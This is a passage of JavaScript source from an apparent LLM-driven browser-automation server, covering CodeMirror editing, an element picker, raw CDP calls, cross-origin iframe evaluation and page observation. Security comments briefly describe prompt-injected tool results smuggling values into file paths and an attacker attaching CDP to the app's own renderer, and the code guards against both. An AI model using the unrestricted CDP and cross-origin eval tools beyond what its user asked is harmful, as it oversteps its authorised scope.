  await page.keyboard.down('Shift');
  await page.keyboard.press('End');
  await page.keyboard.up('Shift');
  // 4 — replace via Input.insertText (CDP-level, bypasses CM6 auto-pairing
  //     of brackets/quotes that mangles content typed via keyboard)
  const session = await page.target().createCDPSession();
  try {
    await session.send('Input.insertText', { text: content });
  } finally {
    try { await session.detach(); } catch (_) {}
  }
  // 5 — save (Ctrl+S). Some hosts intercept it (Lovable does), others ignore.
  if (save) {
    await new Promise(r => setTimeout(r, 80));
    await page.keyboard.down('Control');
    await page.keyboard.press('KeyS');
    await page.keyboard.up('Control');
    await new Promise(r => setTimeout(r, 200));
  }
  return { ok: true, line, length: content.length, saved: !!save };
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 9 — playbook follow-ups (real-session enhancements from session 2)
// ═══════════════════════════════════════════════════════════════════════════
// Three problems this block solves:
//   1. "Save redirects away from ?view=codeEditor"  → cmEnsureEditor
//   2. "No direct 'open file at line N' primitive"  → cmOpenAtLine
//   3. "cm_edit_atomic([{file,find,replace}])"      → cmEditAtomic
//   4. "Element-to-source picker as MCP tool"       → pickerInstall/Capture
//
// All four are built on the Phase 8 primitives (cmFocus, cmGotoLine,
// cmReplaceLine) — no new low-level mechanisms.

// cmEnsureEditor — verify `.cm-content` is mounted on the active page; if not,
// try to re-navigate with `?view=codeEditor` (Lovable's pattern, harmless
// elsewhere). Solves "Save sometimes drops the editor query param".
async function cmEnsureEditor() {
  const page = await _activePage();
  const hasEditor = await page.evaluate(() => !!document.querySelector('.cm-content'));
  if (hasEditor) return { ok: true, alreadyMounted: true, url: page.url() };
  // Try to re-navigate with ?view=codeEditor — only allowed if current URL
  // is itself http(s) (which it must be to host an editor; defense in depth).
  let target;
  try {
    const u = new URL(page.url());
    if (u.protocol !== 'http:' && u.protocol !== 'https:') {
      return { ok: false, error: 'refuse to re-navigate non-http(s) page (' + u.protocol + ')' };
    }
    u.searchParams.set('view', 'codeEditor');
    target = u.toString();
  } catch (_) {
    return { ok: false, error: 'page URL not parseable: ' + page.url() };
  }
  if (target === page.url()) {
    return { ok: false, error: '.cm-content not mounted and URL already has ?view=codeEditor — editor failed to render' };
  }
  await page.goto(target, { waitUntil: 'domcontentloaded', timeout: 30000 });
  _targetActivations.set(page.target()._targetId, Date.now());
  try {
    await page.waitForSelector('.cm-content', { timeout: 5000 });
    return { ok: true, reNavigated: true, url: page.url() };
  } catch (_) {
    return { ok: false, error: 'editor did not mount within 5s after re-navigation', url: page.url() };
  }
}

// cmOpenAtLine — best-effort "open file at line N". Sets `file` and `line`
// query params on the current URL and navigates. Works on hosts that read
// those params (Lovable does — `?file=...&line=...`); falls back to calling
// cmGotoLine after navigation so the line jump is guaranteed even when the
// host ignores the line param.
//
// Caller responsibility: this DOES NOT open files via the search-code UI —
// it assumes the current page (e.g. a Lovable project) understands the file
// param. If the host doesn't, search-code via chrome_input_type is still the
// fallback.
async function cmOpenAtLine({ file, line, targetId } = {}) {
  if (!file || typeof file !== 'string') throw new Error('file (path string) required');
  // Sanity: refuse paths with control chars or scheme-looking prefixes that
  // could be smuggled into search params by a prompt-injected tool result.
  if (/[\x00-\x1f]/.test(file) || /^[a-z]+:/i.test(file)) {
    throw new Error('file: control chars or URL scheme not allowed (got: ' + file.slice(0, 40) + ')');
  }
  const page = await _resolvePage(targetId);
  let target;
  try {
    const u = new URL(page.url());
    if (u.protocol !== 'http:' && u.protocol !== 'https:') {
      return { ok: false, error: 'refuse to navigate non-http(s) page (' + u.protocol + ')' };
    }
    u.searchParams.set('view', 'codeEditor');
    u.searchParams.set('file', file);
    if (typeof line === 'number' && line > 0) u.searchParams.set('line', String(line));
    target = u.toString();
  } catch (_) {
    return { ok: false, error: 'current URL not parseable: ' + page.url() };
  }
  await page.goto(target, { waitUntil: 'domcontentloaded', timeout: 30000 });
  _targetActivations.set(page.target()._targetId, Date.now());
  // Wait for editor to mount
  try {
    await page.waitForSelector('.cm-content', { timeout: 6000 });
  } catch (_) {
    return { ok: false, error: '.cm-content did not mount within 6s — URL params may not be supported by this host', url: page.url() };
  }
  // Belt-and-suspenders: jump to line via Ctrl+G even if the URL param worked
  let jumped = null;
  if (typeof line === 'number' && line > 0) {
    await new Promise(r => setTimeout(r, 200));
    jumped = await cmGotoLine({ line });
  }
  return { ok: true, file, line, url: page.url(), jumped };
}

// cmEditAtomic — multi-file batch editor. Each entry: { line, content, file? }
//   - If `file` is present and different from current, save current → open new
//   - Apply cmReplaceLine with save=false (we batch-save per file)
//   - On file boundary or end-of-list, send Ctrl+S once
//
// Order of edits: caller-controlled. Since cmReplaceLine only replaces (no
// insert/delete), line numbers stay valid in any order.
//
// Returns { ok, edits: [{file,line,ok,error?}], savedFiles: [...] }
async function cmEditAtomic({ edits = [], save = true, ensureEditor = true, targetId } = {}) {
  if (!Array.isArray(edits) || edits.length === 0) {
    throw new Error('edits (non-empty array of {line, content, file?}) required');
  }
  const results = [];
  const savedFiles = new Set();
  let currentFile = null;
  let needsSave = false;

  const saveCurrent = async () => {
    if (!save || !needsSave) return;
    const page = await _resolvePage(targetId);
    await page.keyboard.down('Control');
    await page.keyboard.press('KeyS');
    await page.keyboard.up('Control');
    await new Promise(r => setTimeout(r, 300));
    savedFiles.add(currentFile || '(current)');
    needsSave = false;
  };

  for (let i = 0; i < edits.length; i++) {
    const e = edits[i] || {};
    if (typeof e.line !== 'number' || e.line < 1) {
      results.push({ ...e, ok: false, error: 'edit[' + i + '].line (positive integer) required' });
      continue;
    }
    if (typeof e.content !== 'string') {
      results.push({ ...e, ok: false, error: 'edit[' + i + '].content (string) required' });
      continue;
    }
    try {
      // File-switch handling
      if (e.file && e.file !== currentFile) {
        // Save previous file (if any)
        await saveCurrent();
        if (ensureEditor) await cmEnsureEditor();
        const opened = await cmOpenAtLine({ file: e.file, line: e.line });
        if (!opened.ok) {
          results.push({ ...e, ok: false, error: 'could not open file: ' + (opened.error || 'unknown') });
          continue;
        }
        currentFile = e.file;
      }
      // Apply edit (save=false, we batch-save)
      const r = await cmReplaceLine({ line: e.line, content: e.content, save: false });
      results.push({ ...e, ...r });
      if (r.ok) needsSave = true;
    } catch (err) {
      results.push({ ...e, ok: false, error: err.message });
    }
  }

  // Save the final file
  await saveCurrent();

  const allOk = results.every(r => r.ok);
  return { ok: allOk, edits: results, savedFiles: Array.from(savedFiles) };
}

// ── Element-to-source picker — codified from element_to_source_picker.js ───
// Injects an overlay that highlights any hovered element + shows its React
// fiber `_debugSource` (Vite/CRA dev builds expose this via the JSX-source
// Babel plugin). On click, captures `{ tag, text, classes, source, chain }`
// to `window.__pickerResult` and sets `window.__pickerDone = true`.
// pickerCapture polls those globals and returns the captured result.
// Picker overlay element identity is tracked via a closure-scoped Set, NOT
// via a public data-* attribute. Previously a hostile page could spam
// `data-picker="1"` on every element and the move/click handlers would
// early-return for everything — a DoS against the user's click. Now the
// filter compares element identity against ownNodes (which the page can't
// see), so spamming attributes does nothing.
const PICKER_SCRIPT = `(() => {
  // Clean up any prior picker overlays (legacy data-picker or new sentinel)
  document.querySelectorAll('[data-ccm-picker-overlay]').forEach(e => e.remove());
  window.__pickerResult = null;
  window.__pickerDone = false;
  const ownNodes = new Set();          // closure-scoped — pages cannot poison
  const isOurs = n => {
    while (n && n !== document.body) { if (ownNodes.has(n)) return true; n = n.parentNode; }
    return false;
  };
  const findFiber = el => {
    const k = Object.keys(el).find(k => k.startsWith('__reactFiber$'));
    return k ? el[k] : null;
  };
  const findSource = fiber => {
    let f = fiber, d = 0;
    while (f && d < 30) {
      if (f._debugSource) {
        const t = typeof f.type === 'string' ? f.type : (f.type?.displayName || f.type?.name || '?');
        return { ...f._debugSource, componentType: t };
      }
      f = f.return; d++;
    }
    return null;
  };
  const findSourceChain = fiber => {
    const chain = [];
    let f = fiber, d = 0;
    while (f && d < 30) {
      if (f._debugSource) {
        const t = typeof f.type === 'string' ? f.type : (f.type?.displayName || f.type?.name || '?');
        chain.push({ type: t, file: f._debugSource.fileName.split(/[\\\\/]/).pop(), line: f._debugSource.lineNumber });
      }
      f = f.return; d++;
    }
    return chain;
  };
  const overlay = document.createElement('div');
  overlay.setAttribute('data-ccm-picker-overlay', '1');  // for cleanup-by-selector fallback
  ownNodes.add(overlay);
  Object.assign(overlay.style, {
    position: 'fixed', pointerEvents: 'none', border: '2px solid #00e5ff',
    background: 'rgba(0,229,255,0.18)', zIndex: 2147483647, transition: 'all 60ms',
    display: 'none', boxShadow: '0 0 12px rgba(0,229,255,0.6)',
  });
  document.body.appendChild(overlay);
  const tip = document.createElement('div');
  tip.setAttribute('data-ccm-picker-overlay', '1');
  ownNodes.add(tip);
  Object.assign(tip.style, {
    position: 'fixed', pointerEvents: 'none', background: '#0a0a0a',
    color: '#00e5ff', padding: '6px 10px',
    font: '600 12px ui-monospace, SFMono-Regular, monospace',
    zIndex: 2147483647, borderRadius: '6px', display: 'none',
    border: '1px solid #00e5ff', boxShadow: '0 4px 12px rgba(0,0,0,0.5)',
  });
  document.body.appendChild(tip);
  const banner = document.createElement('div');
  banner.setAttribute('data-ccm-picker-overlay', '1');
  ownNodes.add(banner);
  banner.textContent = 'PICKER ACTIVE — hover & click any element';
  Object.assign(banner.style, {
    position: 'fixed', top: '10px', left: '50%', transform: 'translateX(-50%)',
    background: '#00e5ff', color: '#000', padding: '8px 16px',
    font: '600 13px ui-sans-serif, system-ui', zIndex: 2147483647,
    borderRadius: '999px', boxShadow: '0 4px 20px rgba(0,229,255,0.5)',
  });
  document.body.appendChild(banner);
  const move = e => {
    const el = e.target;
    if (isOurs(el)) return;
    const r = el.getBoundingClientRect();
    Object.assign(overlay.style, {
      display: 'block', left: r.x + 'px', top: r.y + 'px',
      width: r.width + 'px', height: r.height + 'px',
    });
    const f = findFiber(el);
    const s = f ? findSource(f) : null;
    tip.textContent = s
      ? '<' + s.componentType + '>  ' + s.fileName.split(/[\\\\/]/).pop() + ':' + s.lineNumber
      : '(no source — not a dev build?)';
    Object.assign(tip.style, {
      display: 'block', left: r.x + 'px', top: Math.max(4, r.y - 30) + 'px',
    });
  };
  const click = e => {
    const el = e.target;
    if (isOurs(el)) return;
    e.preventDefault(); e.stopPropagation();
    const f = findFiber(el);
    const s = f ? findSource(f) : null;
    const chain = f ? findSourceChain(f) : [];
    window.__pickerResult = {
      tag: el.tagName,
      text: (el.textContent || '').slice(0, 120),
      classes: (el.className && el.className.toString) ? el.className.toString() : '',
      source: s, chain,
    };
    window.__pickerDone = true;
    document.removeEventListener('mousemove', move, true);
    document.removeEventListener('click', click, true);
    [overlay, tip, banner].forEach(n => n.remove());
  };
  document.addEventListener('mousemove', move, true);
  document.addEventListener('click', click, true);
  return 'picker installed';
})()`;

async function pickerInstall() {
  const page = await _activePage();
  const session = await page.target().createCDPSession();
  try {
    const r = await session.send('Runtime.evaluate', {
      expression: PICKER_SCRIPT,
      awaitPromise: false,
      returnByValue: true,
    });
    if (r.exceptionDetails) {
      return { ok: false, error: r.exceptionDetails.exception?.description || r.exceptionDetails.text || 'install failed' };
    }
    return { ok: true, message: r.result?.value || 'installed', url: page.url() };
  } finally { try { await session.detach(); } catch (_) {} }
}

async function pickerCapture({ timeoutMs = 30000, targetId } = {}) {
  const page = await _resolvePage(targetId);
  const limitMs = Math.max(1000, Math.min(300000, timeoutMs));
  const t0 = Date.now();
  while (Date.now() - t0 < limitMs) {
    const probe = await page.evaluate(() => ({
      done:   !!window.__pickerDone,
      result: window.__pickerResult,
    }));
    if (probe.done && probe.result) {
      return { ok: true, elapsedMs: Date.now() - t0, ...probe.result };
    }
    await new Promise(r => setTimeout(r, 250));
  }
  return { ok: false, error: 'picker timed out after ' + limitMs + 'ms (no element clicked)' };
}

async function pickerCancel() {
  const page = await _activePage();
  await page.evaluate(() => {
    // Clean both legacy and current sentinel — survives across versions
    document.querySelectorAll('[data-picker], [data-ccm-picker-overlay]').forEach(e => e.remove());
    window.__pickerDone = true;
    window.__pickerResult = null;
  });
  return { ok: true };
}

// ── Generic CDP escape hatch ───────────────────────────────────────────────
// Lets Claude (or the user) call ANY CDP method without us having to wrap it.
// We don't allowlist methods — the caller has already authenticated to the
// HTTP server with the bearer token, so they can do anything the browser
// can do. Safety relies on the auth boundary, not method allowlisting.
async function cdpRaw({ method, params = {}, sessionId } = {}) {
  if (!method) throw new Error('method required (e.g. "Page.captureScreenshot")');
  // SECURITY — if params.targetId is specified, validate it through
  // _pageById (which throws on non-browseable pages). Without this, an
  // attacker could call chrome_cdp_raw{method:'Target.attachToTarget',
  // params:{targetId:<CCM_UI>}} to attach a CDP session directly to CCM's
  // own renderer process and execute arbitrary JS with electronAPI access.
  // The _pageById filter is the auth boundary for targetId addressing —
  // any CDP method that accepts a targetId must funnel through it.
  if (params && typeof params === 'object' && typeof params.targetId === 'string') {
    await _pageById(params.targetId); // throws if non-browseable
  }
  // If caller passes a sessionId from chrome_frame_attach, route the call
  // into that frame's CDPSession instead of opening a fresh top-page one.
  if (sessionId) {
    const sess = _frameSessions.get(sessionId);
    if (!sess) throw new Error(`unknown sessionId ${sessionId} — attach with chrome_frame_attach first`);
    const result = await sess.send(method, params);
    return { ok: true, result, sessionId };
  }
  const page = await _activePage();
  const session = await page.target().createCDPSession();
  try {
    const result = await session.send(method, params);
    return { ok: true, result };
  } finally {
    try { await session.detach(); } catch (_) {}
  }
}

// ── Cross-origin frame access (OOPIFs) ─────────────────────────────────────
// Puppeteer surfaces iframes as separate Targets (target.type() === 'iframe').
// Attaching a CDPSession to one lets us run Runtime.evaluate INSIDE that
// frame's process — bypassing the same-origin DOM wall the parent page hits.
function _sessionIdOf(sess) {
  // CDPSession.id() in newer puppeteer, _sessionId in older builds.
  if (typeof sess.id === 'function') return sess.id();
  return sess._sessionId || sess._targetId || null;
}

async function frameList() {
  const browser = await _ensureBrowser();
  const targets = browser.targets();
  const out = [];
  for (const t of targets) {
    const type = t.type();
    if (type !== 'iframe') continue;
    const url = t.url();
    let parentTargetId = null;
    try { const parent = t._targetInfo && t._targetInfo.openerId; parentTargetId = parent || null; } catch (_) {}
    out.push({
      targetId: t._targetId,
      url,
      type,
      parentTargetId,
      attached: Array.from(_frameSessions.values()).some(s => {
        try { return s._target && s._target._targetId === t._targetId; } catch (_) { return false; }
      }),
    });
  }
  return { frames: out, count: out.length };
}

async function frameAttach({ targetId } = {}) {
  if (!targetId) throw new Error('targetId required (get one from chrome_frame_list)');
  const browser = await _ensureBrowser();
  const target = browser.targets().find(t => t._targetId === targetId);
  if (!target) throw new Error(`no target with id ${targetId} (call chrome_frame_list to refresh)`);
  const sess = await target.createCDPSession();
  // Stash the puppeteer Target on the session so frameList can mark "attached".
  try { sess._target = target; } catch (_) {}
  const sessionId = _sessionIdOf(sess);
  if (!sessionId) throw new Error('attach succeeded but sessionId unavailable from puppeteer build');
  _frameSessions.set(sessionId, sess);
  // Enable Runtime + DOM + Input on this session so eval/click/type work.
  try { await sess.send('Runtime.enable'); } catch (_) {}
  try { await sess.send('DOM.enable'); } catch (_) {}
  try { await sess.send('Page.enable'); } catch (_) {}
  return { ok: true, sessionId, targetId, url: target.url() };
}

async function frameDetach({ sessionId } = {}) {
  if (!sessionId) throw new Error('sessionId required');
  const sess = _frameSessions.get(sessionId);
  if (!sess) return { ok: true, detached: false, reason: 'not in cache' };
  try { await sess.detach(); } catch (_) {}
  _frameSessions.delete(sessionId);
  return { ok: true, detached: true };
}

async function frameEval({ sessionId, expression, awaitPromise = true } = {}) {
  if (!sessionId) throw new Error('sessionId required');
  if (!expression) throw new Error('expression required');
  const sess = _frameSessions.get(sessionId);
  if (!sess) throw new Error(`unknown sessionId ${sessionId} — attach first`);
  const wrapped = `(async () => (${expression}))()`;
  const res = await sess.send('Runtime.evaluate', {
    expression: wrapped,
    awaitPromise,
    returnByValue: true,
  });
  if (res.exceptionDetails) {
    return { ok: false, error: res.exceptionDetails.text || 'eval exception', details: res.exceptionDetails };
  }
  return { ok: true, result: res.result && res.result.value };
}

async function frameClick({ sessionId, selector } = {}) {
  if (!sessionId) throw new Error('sessionId required');
  if (!selector) throw new Error('selector required');
  const sess = _frameSessions.get(sessionId);
  if (!sess) throw new Error(`unknown sessionId ${sessionId} — attach first`);
  // Click via the frame's own DOM — same-frame JS isn't blocked.
  const js = `(() => { const el = document.querySelector(${JSON.stringify(selector)}); if (!el) return { ok:false, error:'not found' }; el.click(); return { ok:true, tag: el.tagName }; })()`;
  const res = await sess.send('Runtime.evaluate', { expression: js, returnByValue: true });
  if (res.exceptionDetails) return { ok: false, error: res.exceptionDetails.text };
  return res.result.value;
}

// ═══════════════════════════════════════════════════════════════════════════
// Phase 11.5 — Auto-stabilize
//
// After every mutating action we wait until the page has actually settled
// before returning. "Settled" = no in-flight navigation, no in-flight fetch/XHR
// for `networkIdleMs`, and no DOM mutations for `mutationIdleMs`. Bounded by
// `timeout`. This is what Playwright calls "auto-waiting" — except we apply it
// to LLM-issued actions where flakiness is the #1 failure mode.
//
// Implementation lives partly in the page (MutationObserver, fetch hook) and
// partly here (Network domain events via CDP).
// ═══════════════════════════════════════════════════════════════════════════
const _STABILIZE_PAGE_SCRIPT = `
(async ({ networkIdleMs, mutationIdleMs, timeout }) => {
  const start = Date.now();
  // Install a hook on first call so we can track in-flight fetches.
  if (!window.__ccmStab) {
    const w = window;
    w.__ccmStab = { inflight: 0, lastNet: Date.now(), lastMut: Date.now() };
    const origFetch = w.fetch;
    if (origFetch) {
      w.fetch = function(...a) {
        w.__ccmStab.inflight++;
        return origFetch.apply(this, a).finally(() => {
          w.__ccmStab.inflight = Math.max(0, w.__ccmStab.inflight - 1);
          w.__ccmStab.lastNet = Date.now();
        });
      };
    }
    const OX = w.XMLHttpRequest;
    if (OX) {
      const send = OX.prototype.send;
      OX.prototype.send = function(...a) {
        w.__ccmStab.inflight++;
        this.addEventListener('loadend', () => {
          w.__ccmStab.inflight = Math.max(0, w.__ccmStab.inflight - 1);
          w.__ccmStab.lastNet = Date.now();
        });
        return send.apply(this, a);
      };
    }
    const mo = new MutationObserver(() => { w.__ccmStab.lastMut = Date.now(); });
    mo.observe(document.documentElement, { childList: true, subtree: true, attributes: true, characterData: true });
    w.__ccmStab.lastMut = Date.now();
  }
  const s = window.__ccmStab;
  // Poll until both quiet OR timeout.
  while (Date.now() - start < timeout) {
    const now = Date.now();
    const netQuiet = s.inflight === 0 && (now - s.lastNet) >= networkIdleMs;
    const mutQuiet = (now - s.lastMut) >= mutationIdleMs;
    const ready    = document.readyState === 'complete';
    if (netQuiet && mutQuiet && ready) {
      return { ok: true, settled: true, waited: now - start };
    }
    await new Promise(r => setTimeout(r, 50));
  }
  return { ok: true, settled: false, waited: Date.now() - start, reason: 'timeout' };
})
`;

// Phase 13 — Resolve which page a tool acts on. When `targetId` is given we
// pick that specific tab without activating it (parallel multi-tab control in
// one turn). When omitted, fall back to the most-recently-activated tab.
async function _resolvePage(targetId) {
  if (targetId) {
    const p = await _pageById(targetId);
    if (!p) throw new Error('No browser-panel tab matches targetId=' + targetId + ' — call chrome_target_list.');
    return p;
  }
  return _activePage();
}

async function _stabilize({ timeout = 5000, networkIdleMs = 500, mutationIdleMs = 200, targetId } = {}) {
  const page = await _resolvePage(targetId);
  try {
    return await page.evaluate(_STABILIZE_PAGE_SCRIPT + '({ networkIdleMs: ' + networkIdleMs + ', mutationIdleMs: ' + mutationIdleMs + ', timeout: ' + timeout + ' })');
  } catch (e) {
    return { ok: true, settled: false, reason: 'context-lost' };
  }
}

async function stabilize(opts = {}) {
  return _stabilize(opts);
}

// ═══════════════════════════════════════════════════════════════════════════
// Phase 11 — Semantic observation (the chrome_observe primitive)
//
// Single fast pass over the page. Returns an indented YAML-style tree of every
// visible+interactive element, plus a flat node list with stable refs. Each
// matched DOM node is tagged with `data-ccm-ref="N"` so subsequent action tools
// can address it by ref (no brittle CSS selectors, no element-IDs that change
// per render). State is cached on window.__ccmObserve so chrome_observe_delta
// can return only what changed since last call.
// ═══════════════════════════════════════════════════════════════════════════
const _OBSERVE_PAGE_SCRIPT = `
(() => {
  const INTERACTIVE = 'a[href],button,input,select,textarea,summary,details,[role],[tabindex]:not([tabindex="-1"]),[contenteditable=""],[contenteditable="true"],[onclick]';
  const ROLE_FROM_TAG = {
    a: 'link', button: 'button', input: null, select: 'combobox', textarea: 'textbox',
    summary: 'button', form: 'form', nav: 'navigation', main: 'main',
    h1:'heading',h2:'heading',h3:'heading',h4:'heading',h5:'heading',h6:'heading',
    img:'image', ul:'list', ol:'list', li:'listitem', table:'table',
    label:'label', dialog:'dialog',
  };
  const INPUT_ROLES = {
    text:'textbox', search:'searchbox', email:'textbox', password:'textbox', tel:'textbox',
    url:'textbox', number:'spinbutton', range:'slider', checkbox:'checkbox', radio:'radio',
    submit:'button', button:'button', reset:'button', file:'button',
    date:'textbox', 'datetime-local':'textbox', time:'textbox', month:'textbox', week:'textbox',
    color:'colorpicker',
  };
  function visible(el) {
    if (!el || el.nodeType !== 1) return false;
    if (el.hidden) return false;
    const rect = el.getBoundingClientRect();
    if (rect.width <= 0 || rect.height <= 0) return false;
    const cs = getComputedStyle(el);
    if (cs.display === 'none' || cs.visibility === 'hidden' || cs.opacity === '0') return false;
    if (el.closest('[aria-hidden="true"]')) return false;
    return true;
  }
  function role(el) {
    const explicit = el.getAttribute('role');
    if (explicit) return explicit;
    const tag = el.tagName.toLowerCase();
    if (tag === 'input') {
      const t = (el.getAttribute('type') || 'text').toLowerCase();
      return INPUT_ROLES[t] || 'textbox';
    }
    return ROLE_FROM_TAG[tag] || tag;
  }
  function accName(el) {
    // Accessible-name approximation: aria-labelledby > aria-label > label[for] >
    // placeholder > value (for buttons) > innerText > alt > title
    const labelledBy = el.getAttribute('aria-labelledby');
    if (labelledBy) {
      const parts = labelledBy.split(/\\s+/).map(id => document.getElementById(id)).filter(Boolean);
      const t = parts.map(n => (n.innerText || n.textContent || '').trim()).join(' ').trim();
      if (t) return t;
    }
    const aria = el.getAttribute('aria-label');
    if (aria) return aria.trim();
    if (el.id) {
      const lab = document.querySelector('label[for="' + CSS.escape(el.id) + '"]');
      if (lab) {
        const t = (lab.innerText || lab.textContent || '').trim();
        if (t) return t;
      }
    }
    const ph = el.getAttribute('placeholder');
    if (ph) return ph.trim();
    if (el.tagName === 'BUTTON' || (el.tagName === 'INPUT' && /^(submit|button|reset)$/i.test(el.type||''))) {
      const t = (el.innerText || el.value || '').trim();
      if (t) return t;
    }
    const txt = (el.innerText || el.textContent || '').trim().replace(/\\s+/g,' ');
    if (txt) return txt.slice(0, 200);
    const alt = el.getAttribute('alt'); if (alt) return alt.trim();
    const title = el.getAttribute('title'); if (title) return title.trim();
    return '';
  }
  function state(el) {
    const s = [];
    if (el.disabled) s.push('disabled');
    if (el.readOnly) s.push('readonly');
    if (el.required) s.push('required');
    if (el.checked) s.push('checked');
    if (el.getAttribute('aria-checked') === 'true') s.push('checked');
    if (el.getAttribute('aria-selected') === 'true') s.push('selected');
    if (el.getAttribute('aria-expanded') === 'true') s.push('expanded');
    if (el.getAttribute('aria-expanded') === 'false') s.push('collapsed');
    if (el.getAttribute('aria-pressed') === 'true') s.push('pressed');
    if (el === document.activeElement) s.push('focused');
    return s;
  }
  function value(el) {
    const tag = el.tagName.toLowerCase();
    if (tag === 'input' || tag === 'textarea' || tag === 'select') {
      const v = el.value;
      if (v !== '' && v != null) return String(v).slice(0, 120);
    }
    return null;
  }

  const nodes = [];
  const seen = new Set();
  // Phase 14 fix - ref stability across observes:
  // Previously refCounter reset to 0 each observe, so element A got ref=5
  // in observe #1, then a different element got ref=5 in observe #2, and
  // any cached ref=5 silently pointed at the wrong element. NOW we preserve
  // the ref of any element that ALREADY has a valid data-ccm-ref from a
  // prior observe, and only assign new numbers to newly-appeared elements.
  // The counter is persisted on window.__ccmObserve.nextRef across calls.
  const prev = window.__ccmObserve || {};
  let nextRef = (typeof prev.nextRef === 'number' && prev.nextRef >= 1) ? prev.nextRef : 1;
  const usedThisSweep = new Set();

  // Sweep interactive + landmark elements
  const candidates = Array.from(document.querySelectorAll(INTERACTIVE));
  // Add landmarks (visible only) for tree skeleton
  const landmarks = Array.from(document.querySelectorAll('h1,h2,h3,h4,form,nav,main,dialog,[role=region],[role=dialog]'));
  for (const el of landmarks) if (!candidates.includes(el)) candidates.push(el);

  for (const el of candidates) {
    if (seen.has(el) || !visible(el)) continue;
    seen.add(el);
    // Reuse a stable ref if this element already has one (numeric, not used
    // earlier in this sweep). Otherwise allocate a new one from nextRef.
    const existing = el.getAttribute('data-ccm-ref');
    let ref;
    if (existing && /^\\d+$/.test(existing) && !usedThisSweep.has(existing)) {
      ref = parseInt(existing, 10);
    } else {
      ref = nextRef++;
      el.setAttribute('data-ccm-ref', String(ref));
    }
    usedThisSweep.add(String(ref));
    const r = el.getBoundingClientRect();
    nodes.push({
      ref,
      tag:   el.tagName.toLowerCase(),
      role:  role(el),
      name:  accName(el),
      value: value(el),
      state: state(el),
      rect:  { x: Math.round(r.left), y: Math.round(r.top), w: Math.round(r.width), h: Math.round(r.height) },
      depth: (() => { let d = 0, p = el.parentElement; while (p) { d++; p = p.parentElement; } return d; })(),
    });
  }

  // Build a parent-pointer index so we can render an indented tree following
  // DOM ancestry but only for nodes we kept.
  const refByEl = new Map();
  for (const el of seen) refByEl.set(el, +el.getAttribute('data-ccm-ref'));
  const parentRefOf = new Map();
  for (const el of seen) {
    let p = el.parentElement;
    while (p) {
      if (refByEl.has(p)) { parentRefOf.set(refByEl.get(el), refByEl.get(p)); break; }
      p = p.parentElement;
    }
  }
  // Render tree by DOM order
  const sorted = nodes.slice().sort((a, b) => a.ref - b.ref);
  const depthByRef = new Map();
  for (const n of sorted) {
    const p = parentRefOf.get(n.ref);
    depthByRef.set(n.ref, p ? (depthByRef.get(p) || 0) + 1 : 0);
  }
  const lines = [];
  for (const n of sorted) {
    const d = depthByRef.get(n.ref) || 0;
    const indent = '  '.repeat(d);
    const name = n.name ? ' "' + n.name.replace(/"/g, '\\\\"').slice(0,140) + '"' : '';
    const val  = n.value != null ? ' = "' + String(n.value).slice(0,80).replace(/"/g, '\\\\"') + '"' : '';
    const st   = n.state.length ? ' (' + n.state.join(',') + ')' : '';
    lines.push(indent + '- [' + n.ref + '] ' + n.role + name + val + st);
  }

  // Hash per ref so delta diffs are cheap
  const sig = {};
  for (const n of nodes) {
    sig[n.ref] = n.role + '|' + n.name + '|' + (n.value||'') + '|' + n.state.join(',');
  }
  // Persist nextRef so the next observe continues the counter instead of
  // resetting (= stable refs across observes for surviving elements).
  window.__ccmObserve = { sig, ts: Date.now(), nextRef };

  return {
    url: location.href,
    title: document.title,
    refCount: nodes.length,
    viewport: { w: innerWidth, h: innerHeight, scrollY: scrollY, scrollX: scrollX },
    tree: lines.join('\\n'),
    nodes,
  };
})()
`;

async function observe({ raw = false, targetId } = {}) {
  const page = await _resolvePage(targetId);
  const result = await page.evaluate(_OBSERVE_PAGE_SCRIPT);
  if (raw) return result;
  // Default: omit the heavy nodes[] from the response (kept page-side in __ccmObserve).
  return {
    url:       result.url,
    title:     result.title,
    refCount:  result.refCount,
    viewport:  result.viewport,
    tree:      result.tree,
  };
}

const _OBSERVE_DELTA_SCRIPT = `
(() => {
  const prev = window.__ccmObserve && window.__ccmObserve.sig;
  if (!prev) return { error: 'no previous observe — call chrome_observe first' };

  // Re-run the same pass; but DON'T re-assign refs to existing tagged nodes.
  // For new untagged interactives, give them fresh refs continuing the sequence.
  const INTERACTIVE = 'a[href],button,input,select,textarea,summary,details,[role],[tabindex]:not([tabindex="-1"]),[contenteditable=""],[contenteditable="true"],[onclick]';
  function visible(el) {
    if (!el || el.nodeType !== 1 || el.hidden) return false;
    const r = el.getBoundingClientRect();
    if (r.width<=0||r.height<=0) return false;
    const cs = getComputedStyle(el);
    return !(cs.display==='none'||cs.visibility==='hidden'||cs.opacity==='0');
  }
  // Reuse the original role/name/value/state logic — we'll inline only what's
  // needed for the signature.
  function compact(el) {
    const tag = el.tagName.toLowerCase();
    const role = el.getAttribute('role') || tag;
    const name = (el.getAttribute('aria-label') || el.innerText || el.value || '').trim().replace(/\\s+/g,' ').slice(0,200);
    const value = (el.value && (tag==='input'||tag==='textarea'||tag==='select')) ? String(el.value).slice(0,120) : '';
    const st = [];
    if (el.disabled) st.push('disabled');
    if (el.checked) st.push('checked');
    if (el.getAttribute('aria-checked')==='true') st.push('checked');
    if (el.getAttribute('aria-selected')==='true') st.push('selected');
    if (el.getAttribute('aria-expanded')==='true') st.push('expanded');
    if (el===document.activeElement) st.push('focused');
    return role + '|' + name + '|' + value + '|' + st.join(',');
  }

  // Continue the ref sequence from the prior observe (don't restart counter).
  const prevState = window.__ccmObserve || {};
  let nextRef = (typeof prevState.nextRef === 'number' && prevState.nextRef >= 1)
    ? prevState.nextRef
    : (() => {
        // Backfill from existing tagged refs if nextRef wasn't persisted yet
        let m = 0;
        for (const el of document.querySelectorAll('[data-ccm-ref]')) {
          const v = +el.getAttribute('data-ccm-ref');
          if (v > m) m = v;
        }
        return m + 1;
      })();
  const tagged = Array.from(document.querySelectorAll('[data-ccm-ref]'));

  const currentRefs = new Set();
  const changed = [], appeared = [], disappeared = [];
  const newSig = {};

  for (const el of tagged) {
    if (!visible(el)) continue;
    const ref = +el.getAttribute('data-ccm-ref');
    currentRefs.add(ref);
    const s = compact(el);
    newSig[ref] = s;
    if (prev[ref] === undefined) { /* shouldn't happen */ }
    else if (prev[ref] !== s) {
      changed.push({ ref, before: prev[ref], after: s });
    }
  }
  for (const refStr of Object.keys(prev)) {
    const ref = +refStr;
    if (!currentRefs.has(ref)) disappeared.push(ref);
  }
  // New interactives + landmarks (no ref yet) - sweep BOTH like observe() does,
